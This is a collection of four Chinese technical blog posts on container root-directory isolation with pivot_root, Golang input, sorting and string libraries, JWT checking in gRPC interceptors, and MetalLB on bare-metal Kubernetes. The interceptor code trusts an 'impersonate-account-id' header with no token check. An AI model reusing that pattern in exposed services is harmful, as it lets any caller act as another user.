[{"content":"在使用容器过程中，我们都知道进入容器后，根目录会变化。在容器中看不到容器外的目录和文件，这本质上是命名空间隔离带来的能力。\n对于容器镜像的结构，通常我们用只读层、读写层来表示不同层级在读写能力上的限制。使用 Docker 或者 Kubernetes 时，使用挂载 “卷” 来进行数据持久化，也就是保留容器中数据的变化，实现读写能力。而容器中本身带有的文件、目录，在销毁容器、重启容器后，它们又会恢复到最初的样子。\n本文使用Linux自带的一些工具来模拟容器中文件系统隔离的特性，将进程的根目录进行替换，替换成我们想给它指定的目录。\nmount 命名空间 mount 命名空间隔离了每个进程可以看到的挂载目录。不同 mount 命名空间中的进程看到、控制的目录都可以是不同的。\nmount 命名空间中有两个重要的概念：\n“共享子树”，它用来解决挂载、卸载事件在不同的 mount namespace 中自动、可控的传递； “对等组”，对等组是一组挂载点，本次实践涉及到共享子树中 MS_SHARED 和 MS_PRIVATE 两种传递类型，它们之间的含义是相反的，前者会和对等组共享挂载和卸载。 其中，我觉得难理解的、重要的地方就是 MS_SHARED 和 MS_PRIVATE 这两种不同的挂载点传递类型：\nMS_SHARED：该挂载点和它的“对等组”共享挂载和卸载事件。当一个挂载点被删除或者添加到namespace中，这些事件会被传递到它的对等组。 MS_PRIVATE: 和共享挂载相反，标记为private的事件不会传递到任何的对等组。 这样一来，就能够控制容器中的文件系统的挂载是不是可以影响到其他mount 命名空间了。\n环境 OS：Ubuntu22.04 5.19.0-46-generic 需要使用的命令：pivot_root，unshare，mount 等 实践 我们先看一下 OS 本身的根目录：\nroot@dev:/# ls bin cdrom etc lib lib64 lost+found mnt opt root sbin srv sys usr workplace boot dev home lib32 libx32 media namespace-feat proc run snap swapfile tmp var 我们最终要将这个 ssh 连接的 bash 进程的 mount 命名空间根目录变为在网上下载的 Ubuntu22.04 的 base 版本的目录。这里将其下载并进行解压。\n我这里把他解压放在这个目录中：\nroot@dev:/workplace/namespace-feat/mock-rootfs# ls ubuntu-base-22.04-base-amd64 pivot_root 我们使用 pivot_root 可以实现容器中根目录可见性的效果：\nroot@dev:/# pivot_root -h Usage: pivot_root [options] new_root put_old Change the root filesystem. Options: -h, --help display this help -V, --version display version For more details see pivot_root(8). 特性 pivot_root命令用于将当前进程的根目录替换为指定目录； 它需要两个参数，分别用于保存当前 mount 命名空间内进程的根挂载，和设置当前进程新的根挂载。分别叫做 put_old 和 new_root ； 挂载之后，它不会自动改变当前进程的根目录，可以使用 chdir(\u0026quot;/\u0026quot;) 显式更改到新的根目录。 注意 new_root和put_old都必须是目录； new_root和put_old不在同一个mount namespace中； put_old必须是new_root，或者是new_root的子目录； new_root必须是mount point，且不能是当前mount namespace的 “/”。 chroot 和 pivot_root区别\nchroot只改变当前进程的 “/”\npivot_root改变当前mount namespace的“/”\nStep1 创建新的命名空间 root@dev:/workplace/namespace-feat/mock-rootfs# unshare -m unshare -m 创建一个新的 mount 命名空间，并让当前进程进入。\nStep2 为 pivot_root 命令准备 new_root 和 put_old 创建 put_old 对应的目录：\nroot@dev:/workplace/namespace-feat/mock-rootfs# mkdir -p ubuntu-base-22.04-base-amd64/.old 执行命令，但是会出现错误：\nroot@dev:/workplace/namespace-feat/mock-rootfs# pivot_root ubuntu-base-22.04-base-amd64/ ubuntu-base-22.04-base-amd64/.old/ pivot_root: failed to change root from `ubuntu-base-22.04-base-amd64/\u0026#39; to `ubuntu-base-22.04-base-amd64/.old/\u0026#39;: Device or resource busy 这是为什么呢？上文提到过，new_root 和 put_old 必须在不同的 mount 命名空间中。而我们的ubuntu-base-22.04-base-amd64/ 和ubuntu-base-22.04-base-amd64/.old/文件夹，都处于执行unshare -m之前的挂载命名空间的挂载目录中。\n所以，我们需要再将ubuntu-base-22.04-base-amd64/挂载一次，因为我们之前执行了unshare -m，当前命令行正处于新的命名空间，因此，挂载后它就处于新的 mount 命名空间了：\nroot@dev:/workplace/namespace-feat/mock-rootfs# mount --bind ubuntu-base-22.04-base-amd64/ ubuntu-base-22.04-base-amd64/ Step3 执行 pivot_root 并查看根目录的改变 root@dev:/workplace/namespace-feat/mock-rootfs# pivot_root ubuntu-base-22.04-base-amd64/ ubuntu-base-22.04-base-amd64/.old/ root@dev:/workplace/namespace-feat/mock-rootfs# ls ubuntu-base-22.04-base-amd64 root@dev:/workplace/namespace-feat/mock-rootfs# cd / root@dev:/# ls bin dev home lib32 libx32 mnt proc run srv tmp var boot etc lib lib64 media opt root sbin sys usr 这样就可以成功切换了。上文提到，pivot_root 切换根目录后，不会自动切换目录。我们手动切到根目录查看文件，再与另一个终端进行对比：\n执行 pivot_root 后，实现了当前进程根目录的切换，就像我们进入容器中，查看根目录下的文件一样，同时宿主机（另一个终端）的根目录没有受到影响。\nRef:\n容器镜像原理-根目录的替换\n黄东升: mount namespace和共享子树\nsparkdev\n","date":"2023-07-09T23:35:19+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/202307092351270.png","permalink":"https://lizonglingo.github.io/p/%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%8F%AF%E8%A7%81%E8%8C%83%E5%9B%B4%E7%9A%84%E5%AE%9E%E8%B7%B5/","title":"容器镜像根目录可见范围的实践"},{"content":"输入输出库 fmt fmt.Scan() fmt.Scan()多用来获取已知长度、已知数量的变量输入。从os.Stdin中获取数据。\n它将碰到第一个空格或换行符之前的内容赋值给变量。如果 Scan()中有多个变量，变量值用空格或换行符分割。所以换行和空 格是不能存储到变量内的。\nfunc main() { var t int fmt.Scan(\u0026amp;t) for i := 0; i \u0026lt; t; i++ { var n int fmt.Scan(\u0026amp;n) sum := 0 for j := 0; j \u0026lt; n; j++ { var a int fmt.Scan(\u0026amp;a) sum += a } fmt.Println(sum) } } fmt.Scanln fmt.Scanln()和fmt.Scan()的用法类似，但唯一区别是当读取多个变量当时候，遇到换行符Scanln()会直接结束，未读到输入值的变量为零值；Scan()会等待，直到输入的值满足参数的个数后再遇到换行符才会结束。\n通常情况下使用Scan()就够了。\nbufio bufio.NewScanner bufio.NewScanner常用于不确定要输入多少数据的情况。例如：\nfunc main() { // 从标准输入输出 os.Stdin 中读取数据 inputBuf := bufio.NewScanner(os.Stdin) // inputBuf.Scan() 用来循环读取下一行 直到出现io.EOF for inputBuf.Scan() { data := inputBuf.Text() tmpStrs := strings.Split(data, \u0026#34;,\u0026#34;) sort.Slice(tmpStrs, func(i, j int) bool { if strings.Compare(tmpStrs[i], tmpStrs[j]) \u0026lt; 0 { return true } else { return false } }) for i, s := range tmpStrs { if i != len(tmpStrs)-1 { fmt.Printf(\u0026#34;%s,\u0026#34;, s) } else { fmt.Printf(\u0026#34;%s\\n\u0026#34;, s) } } } } 排序库 Sort 对 float64 切片进行排序：sort.Float64s(s) import ( \u0026#34;fmt\u0026#34; \u0026#34;sort\u0026#34; ) func main() { s := []float64{5.2, -1.3, 0.7, -3.8, 2.6} // unsorted sort.Float64s(s) fmt.Println(s) // [-3.8 -1.3 0.7 2.6 5.2] } 对 int 切片进行排序：sort.Ints(s) import ( \u0026#34;fmt\u0026#34; \u0026#34;sort\u0026#34; ) func main() { s := []int{5, 2, 6, 3, 1, 4} // unsorted sort.Ints(s) fmt.Println(s) // [1 2 3 4 5 6] } 对 slice 使用自定义排序顺序：sort.Slice(x any, less func(i, j int) bool) import ( \u0026#34;fmt\u0026#34; \u0026#34;sort\u0026#34; ) func main() { people := []struct { Name string Age int }{ {\u0026#34;Gopher\u0026#34;, 7}, {\u0026#34;Alice\u0026#34;, 55}, {\u0026#34;Vera\u0026#34;, 24}, {\u0026#34;Bob\u0026#34;, 75}, } sort.Slice(people, func(i, j int) bool { return people[i].Age \u0026lt; people[j].Age }) fmt.Println(\u0026#34;By age:\u0026#34;, people) // By age: [{Gopher 7} {Vera 24} {Alice 55} {Bob 75}] } 字符串处理 strings Split ¶ 根据指定字符进行分割，需要注意字符串首尾：func Split(s, sep string) []string package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { fmt.Printf(\u0026#34;%q\\n\u0026#34;, strings.Split(\u0026#34;a,b,c\u0026#34;, \u0026#34;,\u0026#34;)) fmt.Printf(\u0026#34;%q\\n\u0026#34;, strings.Split(\u0026#34;a man a plan a canal panama\u0026#34;, \u0026#34;a \u0026#34;)) fmt.Printf(\u0026#34;%q\\n\u0026#34;, strings.Split(\u0026#34; xyz \u0026#34;, \u0026#34;\u0026#34;)) fmt.Printf(\u0026#34;%q\\n\u0026#34;, strings.Split(\u0026#34; xyz \u0026#34;, \u0026#34; \u0026#34;)) fmt.Printf(\u0026#34;%q\\n\u0026#34;, strings.Split(\u0026#34;\u0026#34;, \u0026#34;Bernardo O\u0026#39;Higgins\u0026#34;)) } // Output: // [\u0026#34;a\u0026#34; \u0026#34;b\u0026#34; \u0026#34;c\u0026#34;] // [\u0026#34;\u0026#34; \u0026#34;man \u0026#34; \u0026#34;plan \u0026#34; \u0026#34;canal panama\u0026#34;] // [\u0026#34; \u0026#34; \u0026#34;x\u0026#34; \u0026#34;y\u0026#34; \u0026#34;z\u0026#34; \u0026#34; \u0026#34;] // [\u0026#34;\u0026#34; \u0026#34;xyz\u0026#34; \u0026#34;\u0026#34;] // [\u0026#34;\u0026#34;] Index 找到子串的起始位置，如果没有返回 -1: func Index(s, substr string) int package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { fmt.Println(strings.Index(\u0026#34;chicken\u0026#34;, \u0026#34;ken\u0026#34;)) fmt.Println(strings.Index(\u0026#34;chicken\u0026#34;, \u0026#34;dmr\u0026#34;)) } // Output: // 4 // -1 strconv Atoi 字符串类型的数字转化为 int 类型：func Atoi(s string) (int, error) package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { v := \u0026#34;10\u0026#34; if s, err := strconv.Atoi(v); err == nil { fmt.Printf(\u0026#34;%T, %v\u0026#34;, s, s) } } // Output: // int, 10 Itoa 将 int 类型转为字符串：func Itoa(i int) string package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { i := 10 s := strconv.Itoa(i) fmt.Printf(\u0026#34;%T, %v\\n\u0026#34;, s, s) } // Output: // string, 10 ParseInt 灵活的将正数类型转为字符串：func ParseInt(s string, base int, bitSize int) (i int64, err error) 三个参数的含义依次是： 要转换的字符串 转换为几进制，可以是0，2 ~ 36，我们一般用10进制 具体的int类型，可以是 0， 8， 16，32，和64，代表 int，int8，int16，int32和int64，一般用 0 转换为int类型 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { v32 := \u0026#34;-354634382\u0026#34; if s, err := strconv.ParseInt(v32, 10, 32); err == nil { fmt.Printf(\u0026#34;%T, %v\\n\u0026#34;, s, s) } if s, err := strconv.ParseInt(v32, 16, 32); err == nil { fmt.Printf(\u0026#34;%T, %v\\n\u0026#34;, s, s) } v64 := \u0026#34;-3546343826724305832\u0026#34; if s, err := strconv.ParseInt(v64, 10, 64); err == nil { fmt.Printf(\u0026#34;%T, %v\\n\u0026#34;, s, s) } if s, err := strconv.ParseInt(v64, 16, 64); err == nil { fmt.Printf(\u0026#34;%T, %v\\n\u0026#34;, s, s) } } // int64, -354634382 // int64, -3546343826724305832 ","date":"2023-03-25T21:17:37+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/202307092351270.png","permalink":"https://lizonglingo.github.io/p/%E7%AC%94%E8%AF%95%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84golang%E5%BA%93/","title":"笔试中常用的Golang库"},{"content":" 今天在复习之前的项目时，看到这个知识点觉得还是有必要记录一下的，因为：\n平时自己看官方文档或者写 Web 方面的 Demo 项目，很少会去专门考虑身份验证这个问题。一般写着玩的 API 都不会太重视安全问题，难得复习到这一点。 JWT Token 在 Web 中是一种常见的身份验证方式，也是 Web 开发中安全相关的重要知识。 本文所分享的使用 gRPC 拦截器和 Context 的使用场景是：解析 Token 并带着用户信息取执行各个请求。\n本文从以下三个步骤展开分享：\n通过用户 ID 生成 Token 验证 Token 得到用户 ID 通过 gRPC 拦截器和 Context 把 Token 验证转为公共的逻辑 JWT Token原理 JWT 的一些概念 https://jwt.io/\n这张图片包含了 JWT 最重要的一些概念。在 Encoded 中，红色和紫色字段是通过 Base64 编码而来，对应 HEADER 和 PAYLOAD 字段，实际上就是明文，任何人都能通过 Base64 解码得到。\n而蓝色字段则是通过加密生成的。\nDecoded中的字段和含义如下：\n// HEADER { \u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;,\t// 使用的算法类型 \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;\t// 类型是 JWT } // PAYLOAD 包含很多默认字段 { \u0026#34;sub\u0026#34;: \u0026#34;1234567890\u0026#34;,\t// 这个 JWT 颁发给 1234567890 可以理解为用户 ID \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;,\t// 用户的名字 \u0026#34;iat\u0026#34;: 1516239022,\t// 颁发的时间 \u0026#34;exp\u0026#34;: 1516239922,\t// 过期时间 \u0026#34;iss\u0026#34;: \u0026#34;auth\u0026#34;\t// 颁发机构 } RSA 非对称加密 上文中：\n{ \u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;,\t// 使用的算法类型 \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;\t// 类型是 JWT } 有个字段表示加密使用的算法，这里我们使用 RSA 非对称加密。加解密过程如下：\nB 将明文使用 Hash 算法运算得到摘要 摘要使用 B 的私钥进行签名，也就是加密 签名连同明文发给 A A 先将明文用同样的 Hash 算法计算摘要 再使用 B 的公钥，从签名中解出摘要，也就是解密 对比 Hash(明文) 和 解密(签名) 的摘要是否相同 B 的私钥只有 B 自己知道，B 的公钥所有人都能知道。通过签名和验证签名，保证消息确实是 B 所发的，而 Hash 算法则保证明文没有被篡改过。\n这里还有一个问题，就是如何证明公钥确实是 B 的公钥，而不是其他人的呢？这就是 CA 的作用了。\n通过上述方法，服务器将 JWT 带的信息，如用户ID、用户名、过期时间等信息，从 token 解出来，证明这个 token 确实是自己的服务器所颁发的，并且它的信息也是没有被修改过的。因此，用户身份的安全性就在于有没有保护好自己的 token 不被别人窃取。当然，这种行为存在难度。\nGolang 实现 JWT 的 token 颁发和验证 这里我们使用 \u0026quot;github.com/dgrijalva/jwt-go\u0026quot; 这个库来实现，加密方式使用 2048位的 RSA，通过在线的 RSA 公私钥生成网站可以获取公钥文件和私钥文件的 demo。\n生成 JWT package token import ( \u0026#34;crypto/rsa\u0026#34; \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; \u0026#34;time\u0026#34; ) type JWTTokenGen struct { privateKey *rsa.PrivateKey\t// 私钥 issue string\t// 颁发机构 nowTimeFunc func() time.Time\t// 生成时间 } func NewJWTTokenGen(issue string, privateKey *rsa.PrivateKey) *JWTTokenGen { return \u0026amp;JWTTokenGen{ privateKey: privateKey, issue: issue, nowTimeFunc: time.Now,\t// 颁发时使用当前时间 } } func (j *JWTTokenGen) GenerateToken(accountID string, expire time.Duration) (string, error) { nowSec := j.nowTimeFunc().Unix() // 使用 NewWithClaims 生成 // 使用 SHA512 做 hash token := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.StandardClaims{ // StandardClaims 就对应 jwt.io 中 body 的内容字段 Issuer: j.issue, IssuedAt: nowSec, ExpiresAt: nowSec + int64(expire.Seconds()), Subject: accountID, }) // 把 token 使用私钥签名后 以字符串形式返回 return token.SignedString(j.privateKey) } 上文中 *rsa.PrivateKey\t读取方式如下：\n// 其中 *rsa.PrivateKey 从 私钥文件中读取 // 使用 jwt.ParseRSAPrivateKeyFromPEM 加载 pkFile, _ := os.Open(*privateKeyFile) pkBytes, _ := ioutil.ReadAll(pkFile) privateKey, _ := jwt.ParseRSAPrivateKeyFromPEM(pkBytes) 验证 JWT 验证 JWT 是颁发 JWT 的反过程。\n// Package token 验证token 解析 accountID. package token import ( \u0026#34;crypto/rsa\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; ) // JWTTokenVerifier 实现 token verify接口. type JWTTokenVerifier struct { PublicKey *rsa.PublicKey } // Verify 用自己的公钥去验证 token 是否有效. func (jwtv *JWTTokenVerifier) Verify(token string) (string, error) { // 使用 ParseWithClaims 解出 token 信息 这里就是所谓的 claim // 函数签名为 func ParseWithClaims(tokenString string, claims Claims, keyFunc Keyfunc) (*Token, error) // 第三个参数作用是获得验签的公钥 这里直接返回公钥 t, err := jwt.ParseWithClaims(token, \u0026amp;jwt.StandardClaims{}, func(token *jwt.Token) (interface{}, error) { return jwtv.PublicKey, nil }) if err != nil { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;cannot parse token: %v\\n\u0026#34;, err) } // 如果没有通过验证 if !t.Valid { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;token not valid\\n\u0026#34;) } // 解出其中的 claim 字段并验证 claim, ok := t.Claims.(*jwt.StandardClaims) if !ok { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;token claim is not standard claim\\n\u0026#34;) } if err :=claim.Valid(); err != nil { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;claim not valid: %v\\n\u0026#34;, err) } // 这里的 claim.Subject 就是构造 token 是填入的 accountID // token := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.StandardClaims{ //\tIssuer: j.issue, //\tIssuedAt: nowSec, //\tExpiresAt: nowSec + int64(expire.Seconds()), //\tSubject: accountID, // }) return claim.Subject, nil } 上文中的公钥通过下面方法读取：\n// 其中 *rsa.PublicKey 也是通过文件读取 再由 jwt.ParseRSAPublicKeyFromPEM 加载 f, err := os.Open(publicKeyFile) b, err := ioutil.ReadAll(f) pubKey, err := jwt.ParseRSAPublicKeyFromPEM(b) 使用 gRPC 拦截器 + Context 机制将验证接入公共逻辑 对于后端所有的服务，我们都需要验证这条请求是否合法，例如：是不是已经登录的用户发起的请求、token有没有过期或者是否正确。这项工作可以统一在 API 的外部入口处进行，在进入内部微服务后，使用包含用户 id 的 context 在不同微服务之前实现请求身份的标识。\n默认情况下，从内部入口（如微服务网关）进入的请求没有问题，那么在内部的微服务中就是安全的，因为内部微服务不会向外暴露接口。\n引入 gRPC Interceptor gRPC Interceptor 就理解为 gin 中的 middleware，拦截请求做一些处理之后再放行。\n在 NewServer 时会有一些选项：\n// func NewServer(opt ...ServerOption) *Server // 接收一个 ServerOption 列表 // type ServerOption interface { //\tapply(*serverOptions) // } // serverOption 是一种实现 // type serverOption struct { //\tgrpc.EmptyServerOption //\tapply func(*serverOptions) } grpc.NewServer([]grpc.ServerOption...) 而 UnaryInterceptor 返回的 ServerOption 是其中的一种实现，这里我们就用最简单的 UnaryInterceptor 演示：\n// func UnaryInterceptor(i UnaryServerInterceptor) ServerOption // 参数是一个函数 签名如下： // type UnaryServerInterceptor func(ctx context.Context, req interface{}, info *UnaryServerInfo, handler UnaryHandler) (resp interface{}, err error) 也就是说，我们只需要定义好 UnaryServerInterceptor 这个函数，把它交给 UnaryInterceptor，再把 UnaryInterceptor 交给 ServerOption 列表，最后在 NewServer 时把 ServerOption 列表传入，我们的 gRPC Server 就包含我们自定义的这个拦截器了。\n一个验证 token 并转化为 userID 的拦截器 1. 构造 UnaryServerInterceptor 也就是实现这样一个函数：\npackage auth import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; jwt \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; \u0026#34;google.golang.org/grpc/codes\u0026#34; \u0026#34;google.golang.org/grpc/metadata\u0026#34; \u0026#34;google.golang.org/grpc/status\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; ) const ( ImpersonateAccountHeader = \u0026#34;impersonate-account-id\u0026#34; authorizationHeader = \u0026#34;authorization\u0026#34; bearerPrefix = \u0026#34;Bearer \u0026#34; ) type tokenVerify interface { Verify(token string) (string, error) } type interceptor struct { // 需要一个 tokenVerify 接口的实现 // 我们之前实现了一个 JWT 的验证器 直接用就行 // type JWTTokenVerifier struct { //\tPublicKey *rsa.PublicKey // } verifier tokenVerify } // HandleRequest 作为请求拦截处理器，返回的handler是接下来需要做的处理函数 // 实现 grpc.UnaryServerInterceptor 函数： // type UnaryServerInterceptor func(ctx context.Context, req interface{}, info *UnaryServerInfo, handler UnaryHandler) (resp interface{}, err error) func (i *interceptor) HandleRequest(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp interface{}, err error) { // 0. 先检查是否加入特殊身份标识 // 如果有就证明 context 中的 token 已经解出 以 userID 形式在 context 中传递 // 否则从 token 中解出 accountID := impersonationFromContext(ctx) if accountID != \u0026#34;\u0026#34; { return handler(ContextWithAccountID(ctx, id.AccountID(accountID)), req) } // 1. 在这之前已将token加入context // 从最初的context中拿到token tkn, err := tokenFromContext(ctx) if err != nil { return nil, status.Error(codes.Unauthenticated, \u0026#34;\u0026#34;) } // 2. 验证token 拿到 accountID accountID, err = i.verifier.Verify(tkn) if err != nil { return nil, status.Errorf(codes.Unauthenticated, \u0026#34;token not valid: %v\u0026#34;, err) } // 3. 将 accountID 放入 context 中，交给后续的请求执行 // 拦截器捕获 context 取出token // 验证 token 获取 accountID //\t将 accountID 放进 context //\t把新的 context 传下去才真正交给后面的微服务执行 return handler(ContextWithAccountID(ctx, id.AccountID(accountID)), req) } // impersonationFromContext 判断是否需要验证 token 或是 context 中已经验证完 func impersonationFromContext(c context.Context) string { m, ok := metadata.FromIncomingContext(c) if !ok { return \u0026#34;\u0026#34; } imp := m[ImpersonateAccountHeader] if len(imp) == 0 { return \u0026#34;\u0026#34; } return imp[0] } // tokenFromContext 从 context 中拿到 token func tokenFromContext(c context.Context) (string, error) { m, ok := metadata.FromIncomingContext(c)\t// 查看请求有没有数据 if !ok { return \u0026#34;\u0026#34;, status.Error(codes.Unauthenticated, \u0026#34;\u0026#34;) } tkn := \u0026#34;\u0026#34; for _, v := range m[authorizationHeader] { if strings.HasPrefix(v, bearerPrefix) { tkn = v[len(bearerPrefix):] } } if tkn == \u0026#34;\u0026#34; { return \u0026#34;\u0026#34;, status.Error(codes.Unauthenticated, \u0026#34;\u0026#34;) } return tkn, nil } type accountIDKey struct {} // ContextWithAccountID 将accountID写入context. func ContextWithAccountID(c context.Context, aid id.AccountID) context.Context { return context.WithValue(c, accountIDKey{}, aid) } 2. 将构造好的 UnaryServerInterceptor 交给 UnaryInterceptor 根据自己的情况实现上文中的 type tokenVerify interface {}，并构造出 type interceptor struct {}，然后把 UnaryServerInterceptor 交给 UnaryInterceptor 获得 ServerOption：\nserverOption := grpc.UnaryInterceptor(interceptor.HandleRequest) 3. gRPC 在 NewServer 时加入拦截器选项 var gRPCOpts []grpc.ServerOption gRPCOpts = append(gRPCOpts, serverOption) s := grpc.NewServer(gRPCOpts...) pb.RegisterServiceServer(s, \u0026amp;Service{}) s.Serve() 加入后注册自己的服务，启动。这样我们的拦截器就加进去了，任何调用这个 gRPC 服务的请求都会经过这个拦截器的验证。\n","date":"2023-02-24T00:10:12+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/image-20230224023552733.png","permalink":"https://lizonglingo.github.io/p/grpc%E6%8B%A6%E6%88%AA%E5%99%A8%E5%9C%A8jwt%E9%AA%8C%E8%AF%81%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"gRPC拦截器在JWT验证场景下的使用"},{"content":"前言 Kubernetes Service https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/\n在平时开发或者本地环境中，我们常用的服务类型可能是：ClusterIP, NodePort。\n但是，还有两种重要的服务类型：\nLoadBalancer：使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 NodePort 服务和 ClusterIP 服务上。 ExternalName: 通过返回 CNAME 记录和对应值，可以将服务映射到 externalName 字段的内容（例如，foo.bar.example.com）。 无需创建任何类型代理。 这里先简单说一下 ExternalName 的使用情景，如下面的 yaml 定义：\napiVersion: v1 kind: Service metadata: name: backend-service namespace: default spec: type: ExternalName externalName: backend-service.example.svc.cluster.local 与其他 Service 类型不同，ExternalName 类型不通过 Pod 选择器关联 Pod ，而是将 Service 和另外一个域名关联起来。这种方式可以实现：\n配置服务管理另一个命名空间中的服务，屏蔽服务在不同命名空间的调用差异，使得两个服务看起来像是在同一个命名空间下； 通过 Service 名称的方式请求外部服务时，例如请求在集群外的数据库服务，也可以使用这种方法 将微服务依赖的中间件地址配置为 ExternalName 类型，进一步把服务和使用的中间件解耦（将一些中间件服务地址直接用集群访问地址表示），在实际部署的时候通过 ExternalName 方式让微服务访问其他中间件 \u0026hellip; Ingress \u0026ldquo;Ingress 是对集群中服务的外部访问进行管理的 API 对象，典型的访问方式是 HTTP。可以提供负载均衡、SSL 终结和基于名称的虚拟托管。\u0026rdquo;\nhttps://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress/\n在生产中，Ingress 常与 LoadBalancer 配合使用。\nLoadbalancer Loadbalancer 通过负载均衡器来暴露 Service，通过云厂商的负载均衡器提供的外网 IP 来进行访问业务。\n而在实际的业务中，通常将 Loadbalancer 与 Ingress 结合使用。原因有以下几点：\n云厂商的 Loadbalancer 提供的公网 IP 和流量带宽是收费的，通常有多个服务需要暴露，没有必要创建多个 Loadbalancer ，这会增加开销。 每一个服务都用一个公网 IP 也不灵活。 而 Ingress 通过配置域名和路径规则，在一个入口统一接收外部请求，能够转发到不同的集群内部服务中，可以灵活实现集群服务的暴露。 Loadbalancer 类型的服务定义如下：\napiVersion: v1 kind: Service metadata: name: my-service spec: selector: app.kubernetes.io/name: MyApp ports: - protocol: TCP port: 80 targetPort: 9376 clusterIP: 10.0.171.239 type: LoadBalancer 它由 type: LoadBalancer 确定。LoadBalancer 的具体实现依赖云厂商。\n那么在本地集群想使用 LoadBalancer 怎么办呢？我们都知道 LoadBalancer 都是作为云厂商 IaaS 平台的一部分实现的，如果我们的集群没有使用这些公有云，LoadBalancers 类型的服务就会无限处于 Pending 状态。\nMetalLB 解决的就是这个问题。\nMetalLB https://metallb.universe.tf/\n目前，对于本地 Kubernetes 集群的一种称呼是 “裸金属集群”，或许 MetalLB 就是这个意思，在裸金属集群上配置本地的 LoadBalancer。它目前是 CNCF 的沙盒项目，使用标准路由协议实现裸金属集群的 load-balancer。\n通过 MetalLB，我们在本地集群或者私有云中，也可以使用到 LoadBalancer 的能力。\n概念 https://metallb.universe.tf/concepts/\nAddress Allocation 公有云会为 LoadBalancer 类型的服务自动分配一个 IP 地址。MetalLB 不能凭空把这些地址创建出来，我们需要为 MetalLB 分配一个 IP 地址池，这通常取决于我们的内网环境，例如在 192.168.0.0/24 中分配 192.168.0.128/26 作为可用 IP 地址池。这些本地地址都是内网地址，因此需要符合 RFC 1918 规范。\n这样 MetalLB 就可以自动把地址池中的地址分配给服务。\nExternal Announcement 在 LoadBalancer 类型的服务被分到地址之后，我们必须让内网的其他设备知道，这个 IP 的存在。这就像是内网的两个服务器可以知道彼此的 IP 一样。即：此时，这个内网服务器的，k8s集群中的，Service 对外的网络应该表现为，一个内网服务器在网络中的位置。\nMetalLB 使用标准的网络或路由协议来实现这一点，具体取决于使用哪种模式，如：ARP、NDP或BGP协议。\n安装 MetalLB https://metallb.universe.tf/installation/\n前置条件 https://metallb.universe.tf/#requirements\n注意 Kubernetes 网络插件的兼容性，常用的网络组件 Cilium、Flannel等都是兼容的。\n使用 Manifest 安装 $ kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.13.7/config/manifests/metallb-native.yaml 在对应命名空间下有两种组件：\n$ k get po -n metallb-system NAME READY STATUS RESTARTS AGE controller-7597dd4f7b-kzhqd 1/1 Running 0 7h54m speaker-g4rhm 1/1 Running 0 7h54m speaker-m6xtr 1/1 Running 1 (6h38m ago) 7h54m speaker-pmt5w 1/1 Running 0 7h54m speaker-wvvz6 1/1 Running 0 7h54m metallb-system/controller：这是处理 IP 地址分配的，集群维度的控制器。 metallb-system/speaker：是 daemonset 类型。这个组件使用我们所选择的协议，使服务可达。 配置二层模式下的 LoadBalancer 这是最简单且常用的模式。我们只需要分配一个 IP 空间作为 IP 池，然后将其告知 L2Advertisement 即可，L2Advertisement 将这个 IP 池发布出去：\napiVersion: metallb.io/v1beta1 kind: IPAddressPool metadata: name: first-pool namespace: metallb-system spec: addresses: # 我的内网环境是 192.168.0.0/24 # 分配地址范围 - 192.168.0.201-192.168.0.233 --- apiVersion: metallb.io/v1beta1 kind: L2Advertisement metadata: name: example namespace: metallb-system spec: ipAddressPools: - first-pool 创建 LoadBalancer 类型的服务 这里使用 Tekton 的 Dashboard 为例：\napiVersion: v1 kind: Service metadata: labels: ... name: tekton-dashboard namespace: tekton-pipelines spec: ports: - name: http port: 9097 protocol: TCP targetPort: 9097 # 配置为 LoadBalancer 类型 type: LoadBalancer 创建后：\n$ k get svc -n tekton-pipelines NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE tekton-dashboard LoadBalancer 10.100.157.67 192.168.0.201 9097:32176/TCP 18s Metallb 为其分配了 192.168.0.201 这个地址，有两个端口 9097 和 32176。当然，9097 是我们指定的，那 32176 是怎么来的呢？\n先试着访问一下 192.168.0.201:9097 和192.168.0.201:32176：\n发现，192.168.0.201:32176 这个地址不能访问到我们的服务，那它为什么会存在呢？\nLoadBalancer 的端口 为了解决这个疑惑，我重新检查了我的 yaml 文件，发现确实没有 32176 这个端口相关的配置，它像是一个 NodePort 类型服务所有的端口。\n在查询文档后，我想应该是这个原因：\n\u0026ldquo;要实现 type: LoadBalancer 